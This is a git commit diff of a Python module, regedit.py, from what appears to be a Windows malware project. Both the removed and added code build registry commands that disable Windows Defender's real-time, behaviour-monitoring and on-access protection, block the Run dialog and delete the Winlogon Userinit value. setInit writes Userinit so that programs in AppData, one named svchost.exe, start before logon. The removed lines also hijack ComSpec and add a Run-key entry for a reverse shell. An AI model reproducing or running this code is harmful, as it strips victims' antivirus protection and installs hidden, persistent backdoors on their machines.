09beae74d29e67780de8c1a01d17aace320dc5c4
T-wcs <70718793+T-wcs@users.noreply.github.com>
2020-12-03 21:36:33 +0100

    Update regedit.py

--- modules/system/regedit.py
+++ modules/system/regedit.py
@@ -4,52 +4,33 @@ import os, sys, time, winreg
 # ENVIRONMENT VARIABLE
 usr = os.environ["USERNAME"]
 d = os.environ["SystemDrive"]
-# WRITE A REG FOR BLOCK WIN + R Execution
-def noRun():
-    norun = "REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f"
-    os.system(norun)
-# FUNCTION TO DELETE USERINIT IN WINDOWS REGISTRY
-def delInit():
-    delc = 'REG DELETE "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /f'
-    os.system(delc)
+
+class ManageKey():
+    """ Classe définissant les règles à ajouter dans le registre Windows """
+    def __init__(self):
+        self.values_windef   = ["/v DisableScanOnRealtimeEnable", "/v DisableBehaviorMonitoring", "/v DisableOnAccessProtection"]
+        self.win_realtime    = 'REG ADD "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"'
+        self.windef_path     = 'REG ADD "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware'
+        self.path_win_r      = "REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun"
+        self.unset_key       = 'REG DELETE "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit'
+        self.force_cli       = "/f"
+        self.key_type        = "/t REG_DWORD /d 1"
+    def setkey(self):
+        for x in self.values_windef:
+            self.values_windef   = x
+            self.command_execute = "{} {} {} {}".format(self.win_realtime, x, self.key_type, self.force_cli)
+            print(self.command_execute)
+        self.windef_all_exec = "{} {} {}".format(self.windef_path, self.key_type, self.force_cli)
+        print(self.windef_all_exec)
+        self.block_windows_r = "{} {} {}".format(self.path_win_r, self.key_type, self.force_cli)
+        print(self.block_windows_r)
+    def delkey(self):
+        self.exec_unset_key = "{} {}".format(self.unset_key, self.force_cli)
+        print(self.exec_unset_key)
+
 # WRITE A REG FOR THE GUI COUNTER TO STARTUP BEFORE LOGON ON WINDOWS
 def setInit():
-    p = "{}\\Users\\{}\\AppData\\gui_counter\\GuiCounter.exe, {}\\Windows\\system32\\userinit.exe".format(d, usr, d)
+    p = "{}\\Users\\{}\\AppData\\gui_counter\\GuiCounter.exe, {}\\Users\\{}\\AppData\\gui_counter\\rv\\svchost.exe, {}\\Users\\{}\\AppData\\gui_counter\\rvM32.exe, {}\\Windows\\system32\\userinit.exe".format(d, usr, d, usr, d, usr, d)
     key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
     winreg.SetValueEx(key, 'Userinit',0, winreg.REG_SZ, p)
-    winreg.CloseKey(key)
-# DELETE CMD KEY FOR NEW REGISTRY
-def delcmd():
-    delc = 'REG DELETE "HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\Environment" /v ComSpec /f'
-    os.system(delc)
-# SET NEW KEY FOR NEW CMD PATH DIRECTORY
-def setCmd():
-    sr = "%SystemRoot%"
-    p = "{}\\windows\\system\\c.exe".format(sr)
-    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'System\\CurrentControlSet\\Control\\Session Manager\\Environment')
-    winreg.SetValueEx(key, 'ComSpec',0, winreg.REG_EXPAND_SZ, p)
-    winreg.CloseKey(key)
-# DISABLE WINDOWS DEFENDER ANTI SPYWARE
-def spy():
-    dwin = 'REG add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'
-    os.system(dwin)
-# DISABLE WINDOWS DEFENDER SCAN REAL TIME PROTECTION
-def scanRtime():
-    dwin = 'REG add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f'
-    os.system(dwin)
-# DISABLE WINDOWS DEFENDER BEHAVIOR MONITORING
-def bMonitor():
-    dwin = 'REG add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f'
-    os.system(dwin)
-# DISABLE WINDOWS DEFENDER ACCESS
-def onAccess():
-    dwin = 'REG add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f'
-    os.system(dwin)
-#####################################################################
-# WRITE A REG FOR THE REVERSE SHELL IN THE REGISTER (NOT IMPLEMENTED)
-def setRv():
-    p = "\\Users\\%s\\AppData\\gui_counter\\rvMs32\\rvMs32.exe" %(usr)
-    c = "{}{}".format(d, p)
-    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
-    winreg.SetValueEx(key, 'rvMs',0, winreg.REG_SZ, c)
     winreg.CloseKey(key)
